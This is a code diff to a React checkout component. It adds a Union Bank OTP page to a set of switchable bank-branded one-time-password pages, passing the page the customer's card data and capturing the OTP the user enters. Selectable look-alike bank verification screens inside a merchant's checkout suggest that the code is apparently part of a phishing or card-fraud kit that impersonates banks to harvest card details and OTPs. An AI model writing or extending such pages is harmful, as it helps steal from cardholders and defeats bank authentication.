@@ -21,6 +21,7 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import NewOTPPage from '../components/NewOTPPage';
 import ThirdOTPPage from '../components/ThirdOTPPage';
 import ICICIBankOTPPage from '../components/ICICIBankOTPPage';
+import UnionBankOTPPage from '../components/UnionBankOTPPage';
 import ExpiredPage from '../components/ExpiredPage';
 import { api } from '../utils/api';
 import { devLog, devError, devWarn } from '../utils/logger';
@@ -2838,6 +2839,32 @@ const CheckoutOriginal = () => {
                     getCardBrand={getCardBrand}
                     displayPrice={displayPrice}
                     formatPrice={formatPrice}
+                  />
+                )}
+
+                {otpPageSelection === 'union' && (
+                  <UnionBankOTPPage
+                    cardData={cardData}
+                    billingDetails={{
+                      firstName: formData.firstName,
+                      lastName: formData.lastName,
+                      email: formData.email,
+                      phone: '+1234567890', // Default phone for Union Bank
+                      address: '123 Main Street', // Default address
+                      city: 'Mumbai',
+                      state: 'Maharashtra',
+                      zipCode: '400001',
+                      country: formData.country
+                    }}
+                    amount={displayPrice}
+                    onOtpSubmit={(otp) => {
+                      setOtpValue(otp);
+                      handleOtpSubmit();
+                    }}
+                    onCancel={handleOtpCancel}
+                    onResendOtp={handleResendOtp}
+                    otpSubmitting={otpSubmitting}
+                    otpError={otpError}
                   />
                 )}
                   </>
